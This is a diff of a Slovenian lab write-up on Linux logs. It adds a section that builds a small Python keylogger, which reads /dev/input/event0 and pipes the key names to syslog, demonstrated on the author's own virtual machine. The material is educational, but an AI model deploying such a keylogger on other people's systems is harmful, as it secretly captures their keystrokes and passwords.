@@ -3,7 +3,8 @@
 ## Navodila
 
 1. Poišči datoteke, ki beležijo dogodke pod operacijskim sistemom Linux.
-2. Pošiljaj beležke v realnem času preko mreže med dvema navideznima računalnikoma.
+2. Pošlji beležke v realnem času preko mreže med dvema navideznima računalnikoma.
+3. Implementiraj program, ki bere pritiske tipkovnice in jih pošilja v sistemski dnevnik.
 
 ## Dodatne informacije
 
@@ -363,32 +364,32 @@ Sedaj izpišemo še ostale beležke v mapi `/var/log`, `/var/lib` in `.cache` te
 
     ls /var/log
 
-    alternatives.log    btmp.1	    gdm3	       syslog
-    alternatives.log.1  cups	    installer	       syslog.1
-    apache2		    daemon.log	    journal	       unattended-upgrades
-    apt		    daemon.log.1    kern.log	       user.log
-    auth.log	    debug	    kern.log.1	       user.log.1
-    auth.log.1	    debug.1	    lastlog	       vboxadd-install.log
-    boot.log	    dpkg.log	    messages	       vboxadd-setup.log
-    boot.log.1	    dpkg.log.1	    messages.1	       wtmp
-    boot.log.2	    faillog	    private
-    btmp		    fontconfig.log  speech-dispatcher
+    alternatives.log    btmp.1	        gdm3	            syslog
+    alternatives.log.1  cups	        installer	        syslog.1
+    apache2		        daemon.log	    journal	            unattended-upgrades
+    apt		            daemon.log.1    kern.log	        user.log
+    auth.log	        debug	        kern.log.1	        user.log.1
+    auth.log.1	        debug.1	        lastlog	            vboxadd-install.log
+    boot.log	        dpkg.log	    messages	        vboxadd-setup.log
+    boot.log.1	        dpkg.log.1	    messages.1	        wtmp
+    boot.log.2	        faillog	        private
+    btmp		        fontconfig.log  speech-dispatcher
 
     ls /var/lib
 
-    AccountsService      emacsen-common  PackageKit  ucf
-    alsa		     fwupd	     pam	 udisks2
-    apache2		     gdm3	     plymouth	 unattended-upgrades
-    app-info	     geoclue	     polkit-1	 upower
-    apt		     ghostscript     private	 usb_modeswitch
-    aspell		     grub	     python	 usbutils
-    boltd		     ispell	     realmd	 VBoxGuestAdditions
-    colord		     libreoffice     sgml-base	 vim
-    dbus		     logrotate	     snmp	 xfonts
-    dhcp		     man-db	     sudo	 xkb
-    dictionaries-common  misc	     synaptic	 xml-core
-    dkms		     NetworkManager  systemd
-    dpkg		     os-prober	     tpm
+    AccountsService     emacsen-common  PackageKit  ucf
+    alsa		        fwupd	        pam	        udisks2
+    apache2		        gdm3	        plymouth	unattended-upgrades
+    app-info	        geoclue	        polkit-1	upower
+    apt		            ghostscript     private	    usb_modeswitch
+    aspell		        grub	        python	    usbutils
+    boltd		        ispell	        realmd	    VBoxGuestAdditions
+    colord		        libreoffice     sgml-base	vim
+    dbus		        logrotate	    snmp	    xfonts
+    dhcp		        man-db	        sudo	    xkb
+    dictionaries-common misc	        synaptic	xml-core
+    dkms		        NetworkManager  systemd
+    dpkg		        os-prober	    tpm
 
     ls .cache
 
@@ -634,5 +635,381 @@ Na prvem navideznem računalniku se nam sedaj pojavi nov dogodek v datoteki `/va
     Apr  4 14:59:58 debian systemd[1]: Started System Logging Service.
     Apr  4 15:10:28 debian aleks: This is a test event!
 
-###
+### 3. Program za beleženje pritiskov na tipkovnici
 
+Najprej moramo ugotoviti, kako sploh pridemo do dogodkov, ki jih proži tipkovnica. Na operacijskem sistemu Linux imamo mapo `/dev`, ki vsebuje vse naprave, medtem ko mapa `/dev/input` vsebuje vse vhodne naprave. Vse naprave, ki prožije dogodke pa so navedene v datoteki `/proc/bus/input/devices`
+
+    ls /dev
+
+    autofs		    input	       sdb	    tty18	tty39  tty6	      vcs6
+    block		    kmsg	       sdb1	    tty19	tty4   tty60	  vcsa
+    bsg		        log	           sg0	    tty2	tty40  tty61	  vcsa1
+    btrfs-control	loop-control   sg1	    tty20	tty41  tty62	  vcsa2
+    bus		        mapper         sg2	    tty21	tty42  tty63	  vcsa3
+    cdrom		    mem	           shm	    tty22	tty43  tty7	      vcsa4
+    char		    mqueue         snapshot tty23	tty44  tty8	      vcsa5
+    console		    net	           snd	    tty24	tty45  tty9	      vcsa6
+    core		    null	       sr0	    tty25	tty46  ttyS0	  vcsu
+    cpu		        nvram	       stderr	tty26	tty47  ttyS1	  vcsu1
+    cpu_dma_latency port	       stdin	tty27	tty48  ttyS2	  vcsu2
+    cuse		    ppp	           stdout	tty28	tty49  ttyS3	  vcsu3
+    disk		    psaux	       tty	    tty29	tty5   uhid	      vcsu4
+    dri		        ptmx	       tty0	    tty3	tty50  uinput	  vcsu5
+    dvd		        pts	           tty1	    tty30	tty51  urandom	  vcsu6
+    fb0		        random         tty10	tty31	tty52  vboxguest  vfio
+    fd		        rfkill         tty11	tty32	tty53  vboxuser   vga_arbiter
+    full		    rtc	           tty12	tty33	tty54  vcs	      vhci
+    fuse		    rtc0	       tty13	tty34	tty55  vcs1	      vhost-net
+    hidraw0		    sda	           tty14	tty35	tty56  vcs2	      vhost-vsock
+    hpet		    sda1	       tty15	tty36	tty57  vcs3	      zero
+    hugepages	    sda2	       tty16	tty37	tty58  vcs4
+    initctl		    sda5	       tty17	tty38	tty59  vcs5
+
+    ls /dev/input
+
+    by-id	 event0  event2  event4  event6  js0  mice    mouse1
+    by-path  event1  event3  event5  event7  js1  mouse0
+
+    cat /proc/bus/input/devices
+
+    I: Bus=0011 Vendor=0001 Product=0001 Version=ab41
+    N: Name="AT Translated Set 2 keyboard"
+    P: Phys=isa0060/serio0/input0
+    S: Sysfs=/devices/platform/i8042/serio0/input/input0
+    U: Uniq=
+    H: Handlers=sysrq kbd leds event0 
+    B: PROP=0
+    B: EV=120013
+    B: KEY=402000000 3803078f800d001 feffffdfffefffff fffffffffffffffe
+    B: MSC=10
+    B: LED=7
+
+    I: Bus=0019 Vendor=0000 Product=0001 Version=0000
+    N: Name="Power Button"
+    P: Phys=LNXPWRBN/button/input0
+    S: Sysfs=/devices/LNXSYSTM:00/LNXPWRBN:00/input/input2
+    U: Uniq=
+    H: Handlers=kbd event1 
+    B: PROP=0
+    B: EV=3
+    B: KEY=10000000000000 0
+
+    I: Bus=0019 Vendor=0000 Product=0006 Version=0000
+    N: Name="Video Bus"
+    P: Phys=LNXVIDEO/video/input0
+    S: Sysfs=/devices/LNXSYSTM:00/LNXSYBUS:00/PNP0A03:00/LNXVIDEO:00/input/input3
+    U: Uniq=
+    H: Handlers=kbd event2 
+    B: PROP=0
+    B: EV=3
+    B: KEY=3e000b00000000 0 0 0
+
+    I: Bus=0019 Vendor=0000 Product=0003 Version=0000
+    N: Name="Sleep Button"
+    P: Phys=LNXSLPBN/button/input0
+    S: Sysfs=/devices/LNXSYSTM:00/LNXSLPBN:00/input/input4
+    U: Uniq=
+    H: Handlers=kbd event3 
+    B: PROP=0
+    B: EV=3
+    B: KEY=4000 0 0
+
+    I: Bus=0011 Vendor=0002 Product=0006 Version=0000
+    N: Name="ImExPS/2 Generic Explorer Mouse"
+    P: Phys=isa0060/serio1/input0
+    S: Sysfs=/devices/platform/i8042/serio1/input/input5
+    U: Uniq=
+    H: Handlers=mouse0 event4 
+    B: PROP=1
+    B: EV=7
+    B: KEY=1f0000 0 0 0 0
+    B: REL=143
+
+    I: Bus=0003 Vendor=80ee Product=0021 Version=0110
+    N: Name="VirtualBox USB Tablet"
+    P: Phys=usb-0000:00:06.0-1/input0
+    S: Sysfs=/devices/pci0000:00/0000:00:06.0/usb1/1-1/1-1:1.0/0003:80EE:0021.0001/input/input6
+    U: Uniq=
+    H: Handlers=mouse1 event5 js0 
+    B: PROP=0
+    B: EV=1f
+    B: KEY=1f0000 0 0 0 0
+    B: REL=1940
+    B: ABS=3
+    B: MSC=10
+
+    I: Bus=0001 Vendor=80ee Product=cafe Version=0601
+    N: Name="VirtualBox mouse integration"
+    P: Phys=
+    S: Sysfs=/devices/pci0000:00/0000:00:04.0/input/input7
+    U: Uniq=
+    H: Handlers=event6 js1 
+    B: PROP=0
+    B: EV=b
+    B: KEY=10000 0 0 0 0
+    B: ABS=3
+
+    I: Bus=0010 Vendor=001f Product=0001 Version=0100
+    N: Name="PC Speaker"
+    P: Phys=isa0061/input0
+    S: Sysfs=/devices/platform/pcspkr/input/input8
+    U: Uniq=
+    H: Handlers=kbd event7 
+    B: PROP=0
+    B: EV=40001
+    B: SND=6
+
+V naše primeru tipkovnica pošilja dogodke na vhod `event0`. Da ugotovimo kakšne dogodke proži tipkovnica namestimo program [`evtest`](https://manpages.org/evtest) z upravljalcem paketov našega operacijskega sistema.
+
+    apt update
+    apt install evtest
+
+    evtest
+
+    No device specified, trying to scan all of /dev/input/event*
+    Available devices:
+    /dev/input/event0:	AT Translated Set 2 keyboard
+    /dev/input/event1:	Power Button
+    /dev/input/event2:	Video Bus
+    /dev/input/event3:	Sleep Button
+    /dev/input/event4:	ImExPS/2 Generic Explorer Mouse
+    /dev/input/event5:	VirtualBox USB Tablet
+    /dev/input/event6:	VirtualBox mouse integration
+    /dev/input/event7:	PC Speaker
+    Select the device event number [0-7]: 0
+    Input driver version is 1.0.1
+    Input device ID: bus 0x11 vendor 0x1 product 0x1 version 0xab41
+    Input device name: "AT Translated Set 2 keyboard"
+    Supported events:
+    Event type 0 (EV_SYN)
+    Event type 1 (EV_KEY)
+        Event code 1 (KEY_ESC)
+        Event code 2 (KEY_1)
+        Event code 3 (KEY_2)
+        Event code 4 (KEY_3)
+        Event code 5 (KEY_4)
+        Event code 6 (KEY_5)
+        Event code 7 (KEY_6)
+        Event code 8 (KEY_7)
+        Event code 9 (KEY_8)
+        Event code 10 (KEY_9)
+        Event code 11 (KEY_0)
+        Event code 12 (KEY_MINUS)
+        Event code 13 (KEY_EQUAL)
+        Event code 14 (KEY_BACKSPACE)
+        Event code 15 (KEY_TAB)
+        Event code 16 (KEY_Q)
+        Event code 17 (KEY_W)
+        Event code 18 (KEY_E)
+        Event code 19 (KEY_R)
+        Event code 20 (KEY_T)
+        Event code 21 (KEY_Y)
+        Event code 22 (KEY_U)
+        Event code 23 (KEY_I)
+        Event code 24 (KEY_O)
+        Event code 25 (KEY_P)
+        Event code 26 (KEY_LEFTBRACE)
+        Event code 27 (KEY_RIGHTBRACE)
+        Event code 28 (KEY_ENTER)
+        Event code 29 (KEY_LEFTCTRL)
+        Event code 30 (KEY_A)
+        Event code 31 (KEY_S)
+        Event code 32 (KEY_D)
+        Event code 33 (KEY_F)
+        Event code 34 (KEY_G)
+        Event code 35 (KEY_H)
+        Event code 36 (KEY_J)
+        Event code 37 (KEY_K)
+        Event code 38 (KEY_L)
+        Event code 39 (KEY_SEMICOLON)
+        Event code 40 (KEY_APOSTROPHE)
+        Event code 41 (KEY_GRAVE)
+        Event code 42 (KEY_LEFTSHIFT)
+        Event code 43 (KEY_BACKSLASH)
+        Event code 44 (KEY_Z)
+        Event code 45 (KEY_X)
+        Event code 46 (KEY_C)
+        Event code 47 (KEY_V)
+        Event code 48 (KEY_B)
+        Event code 49 (KEY_N)
+        Event code 50 (KEY_M)
+        Event code 51 (KEY_COMMA)
+        Event code 52 (KEY_DOT)
+        Event code 53 (KEY_SLASH)
+        Event code 54 (KEY_RIGHTSHIFT)
+        Event code 55 (KEY_KPASTERISK)
+        Event code 56 (KEY_LEFTALT)
+        Event code 57 (KEY_SPACE)
+        Event code 58 (KEY_CAPSLOCK)
+        Event code 59 (KEY_F1)
+        Event code 60 (KEY_F2)
+        Event code 61 (KEY_F3)
+        Event code 62 (KEY_F4)
+        Event code 63 (KEY_F5)
+        Event code 64 (KEY_F6)
+        Event code 65 (KEY_F7)
+        Event code 66 (KEY_F8)
+        Event code 67 (KEY_F9)
+        Event code 68 (KEY_F10)
+        Event code 69 (KEY_NUMLOCK)
+        Event code 70 (KEY_SCROLLLOCK)
+        Event code 71 (KEY_KP7)
+        Event code 72 (KEY_KP8)
+        Event code 73 (KEY_KP9)
+        Event code 74 (KEY_KPMINUS)
+        Event code 75 (KEY_KP4)
+        Event code 76 (KEY_KP5)
+        Event code 77 (KEY_KP6)
+        Event code 78 (KEY_KPPLUS)
+        Event code 79 (KEY_KP1)
+        Event code 80 (KEY_KP2)
+        Event code 81 (KEY_KP3)
+        Event code 82 (KEY_KP0)
+        Event code 83 (KEY_KPDOT)
+        Event code 85 (KEY_ZENKAKUHANKAKU)
+        Event code 86 (KEY_102ND)
+        Event code 87 (KEY_F11)
+        Event code 88 (KEY_F12)
+        Event code 89 (KEY_RO)
+        Event code 90 (KEY_KATAKANA)
+        Event code 91 (KEY_HIRAGANA)
+        Event code 92 (KEY_HENKAN)
+        Event code 93 (KEY_KATAKANAHIRAGANA)
+        Event code 94 (KEY_MUHENKAN)
+        Event code 95 (KEY_KPJPCOMMA)
+        Event code 96 (KEY_KPENTER)
+        Event code 97 (KEY_RIGHTCTRL)
+        Event code 98 (KEY_KPSLASH)
+        Event code 99 (KEY_SYSRQ)
+        Event code 100 (KEY_RIGHTALT)
+        Event code 102 (KEY_HOME)
+        Event code 103 (KEY_UP)
+        Event code 104 (KEY_PAGEUP)
+        Event code 105 (KEY_LEFT)
+        Event code 106 (KEY_RIGHT)
+        Event code 107 (KEY_END)
+        Event code 108 (KEY_DOWN)
+        Event code 109 (KEY_PAGEDOWN)
+        Event code 110 (KEY_INSERT)
+        Event code 111 (KEY_DELETE)
+        Event code 112 (KEY_MACRO)
+        Event code 113 (KEY_MUTE)
+        Event code 114 (KEY_VOLUMEDOWN)
+        Event code 115 (KEY_VOLUMEUP)
+        Event code 116 (KEY_POWER)
+        Event code 117 (KEY_KPEQUAL)
+        Event code 118 (KEY_KPPLUSMINUS)
+        Event code 119 (KEY_PAUSE)
+        Event code 121 (KEY_KPCOMMA)
+        Event code 122 (KEY_HANGUEL)
+        Event code 123 (KEY_HANJA)
+        Event code 124 (KEY_YEN)
+        Event code 125 (KEY_LEFTMETA)
+        Event code 126 (KEY_RIGHTMETA)
+        Event code 127 (KEY_COMPOSE)
+        Event code 128 (KEY_STOP)
+        Event code 140 (KEY_CALC)
+        Event code 142 (KEY_SLEEP)
+        Event code 143 (KEY_WAKEUP)
+        Event code 155 (KEY_MAIL)
+        Event code 156 (KEY_BOOKMARKS)
+        Event code 157 (KEY_COMPUTER)
+        Event code 158 (KEY_BACK)
+        Event code 159 (KEY_FORWARD)
+        Event code 163 (KEY_NEXTSONG)
+        Event code 164 (KEY_PLAYPAUSE)
+        Event code 165 (KEY_PREVIOUSSONG)
+        Event code 166 (KEY_STOPCD)
+        Event code 172 (KEY_HOMEPAGE)
+        Event code 173 (KEY_REFRESH)
+        Event code 183 (KEY_F13)
+        Event code 184 (KEY_F14)
+        Event code 185 (KEY_F15)
+        Event code 217 (KEY_SEARCH)
+        Event code 226 (KEY_MEDIA)
+    Event type 4 (EV_MSC)
+        Event code 4 (MSC_SCAN)
+    Event type 17 (EV_LED)
+        Event code 0 (LED_NUML) state 0
+        Event code 1 (LED_CAPSL) state 0
+        Event code 2 (LED_SCROLLL) state 0
+    Key repeat handling:
+    Repeat type 20 (EV_REP)
+        Repeat code 0 (REP_DELAY)
+        Value    250
+        Repeat code 1 (REP_PERIOD)
+        Value     33
+    Properties:
+    Testing ... (interrupt to exit)
+    Event: time 1680637986.976124, type 4 (EV_MSC), code 4 (MSC_SCAN), value 1c
+    Event: time 1680637986.976124, type 1 (EV_KEY), code 28 (KEY_ENTER), value 0
+    Event: time 1680637986.976124, -------------- SYN_REPORT ------------
+    Event: time 1680637990.155637, type 4 (EV_MSC), code 4 (MSC_SCAN), value 20
+    Event: time 1680637990.155637, type 1 (EV_KEY), code 32 (KEY_D), value 1
+    Event: time 1680637990.155637, -------------- SYN_REPORT ------------
+    dEvent: time 1680637990.303721, type 4 (EV_MSC), code 4 (MSC_SCAN), value 20
+    Event: time 1680637990.303721, type 1 (EV_KEY), code 32 (KEY_D), value 0
+    Event: time 1680637990.303721, -------------- SYN_REPORT ------------
+    Event: time 1680637991.193166, type 4 (EV_MSC), code 4 (MSC_SCAN), value 21
+    Event: time 1680637991.193166, type 1 (EV_KEY), code 33 (KEY_F), value 1
+    Event: time 1680637991.193166, -------------- SYN_REPORT ------------
+    fEvent: time 1680637991.324400, type 4 (EV_MSC), code 4 (MSC_SCAN), value 21
+    Event: time 1680637991.324400, type 1 (EV_KEY), code 33 (KEY_F), value 0
+    Event: time 1680637991.324400, -------------- SYN_REPORT ------------
+    Event: time 1680637992.015830, type 4 (EV_MSC), code 4 (MSC_SCAN), value 24
+    Event: time 1680637992.015830, type 1 (EV_KEY), code 36 (KEY_J), value 1
+    Event: time 1680637992.015830, -------------- SYN_REPORT ------------
+    jEvent: time 1680637992.175462, type 4 (EV_MSC), code 4 (MSC_SCAN), value 24
+    Event: time 1680637992.175462, type 1 (EV_KEY), code 36 (KEY_J), value 0
+    Event: time 1680637992.175462, -------------- SYN_REPORT ------------
+
+Iz `eventX` preberemo po [16 B na enkrat ki hranijo](https://www.kernel.org/doc/Documentation/input/input.txt):
+- Unsigned integer (4 B) - Čas v sekundah.
+- Unsigned integer (4 B) - Čas v mikro sekundah.
+- Short (2 B) - Tip dogodka.
+- Short (2 B) - Koda dogodka.
+- Integer (4 B) - Vrednost, ki opisuje dogodek.
+
+Sedaj napišemo naš program v programskem jeziku Python, ki bere dogodke z vhodne naprave `/dev/input/event0`. Na enkrat prebere 16 B, ki predstavljajo sekunde, mikro sekunde, tip, kodo in vrednost. Ker želimo izpisovati samo po en dogodek ob pritisku na tipkovnico potem tvorimo dogodek le v primeru, ko ima tip vrednost 1 in vrednost in prav tako vrednost 1. Sedaj pretvorimo kodo tipke v tekstovni opis, za katerega rabimo knjižnico [`evdev`](https://pypi.org/project/evdev/) in izpišemo dogodek na standardni izhod. Nato še omogočimo, da se program zažene z ukazom [`chmod`](https://www.man7.org/linux/man-pages/man1/chmod.1.html).
+
+    apt update
+    apt install python3-evdev
+
+    nano keylogger.py
+    
+    #!/usr/bin/env python3
+
+    from evdev import ecodes
+    import struct
+    import sys
+
+    with open("/dev/input/event0", "rb") as f:
+            while True:
+                    d = f.read(16)
+                    sec, usec, type, code, value = struct.unpack("IIhhi", d)
+                    if type == 1 and value == 1:
+                            print(ecodes.KEY[code])
+                            sys.stdout.flush()    
+    
+    chmod +x keylogger.py
+
+Sedaj še preizkusimo delovanje, tako da v enem oknu ukazne vrstice poženemo naš program in preusmerimo njegov izhod v program `logger`. V drugem oknu ukazne vrstice pa poženemo izpisovanje sistemskih belež `/var/log/syslog` v realnem času ter začnemo pritiskati na poljubne tipke na tipkovnic..
+
+    ./keylogger.py | logger
+
+    tail -f /var/log/syslog
+
+    Apr  4 22:22:26 debian aleks: KEY_T
+    Apr  4 22:22:27 debian aleks: KEY_H
+    Apr  4 22:22:27 debian aleks: KEY_I
+    Apr  4 22:22:28 debian aleks: KEY_S
+    Apr  4 22:22:28 debian aleks: KEY_SPACE
+    Apr  4 22:22:29 debian aleks: KEY_I
+    Apr  4 22:22:29 debian aleks: KEY_S
+    Apr  4 22:22:30 debian aleks: KEY_SPACE
+    Apr  4 22:22:30 debian aleks: KEY_A
+    Apr  4 22:22:30 debian aleks: KEY_SPACE
+    Apr  4 22:22:31 debian aleks: KEY_T
+    Apr  4 22:22:31 debian aleks: KEY_E
+    Apr  4 22:22:32 debian aleks: KEY_S
+    Apr  4 22:22:32 debian aleks: KEY_T
